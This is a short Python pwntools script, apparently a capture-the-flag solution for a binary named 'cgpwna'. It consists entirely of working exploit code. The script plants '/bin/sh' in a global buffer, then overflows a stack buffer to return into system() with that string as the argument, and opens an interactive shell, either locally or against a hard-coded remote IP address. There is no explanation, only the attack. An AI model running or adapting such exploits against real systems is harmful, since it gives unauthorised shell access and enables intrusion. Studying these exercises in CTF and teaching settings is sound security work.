from pwn import *

if args['REMOTE']:
	r=remote('182.254.217.142',10001)
else:
	r=process('./cgpwna')

r.recvuntil('your choice:')

r.sendline('1')

r.recvuntil('you can leave some message here:')

bss_A='/bin/sh\0'+'a'*0x20+'100'

r.sendline(bss_A)

bin_addr=0x0804A080

system_addr=0x080483F0

payload='a'*0x30+'a'*4

payload+=p32(system_addr)

payload+=p32(0)

payload+=p32(bin_addr)

r.recvuntil('your name please:')

r.sendline(payload)

r.interactive()
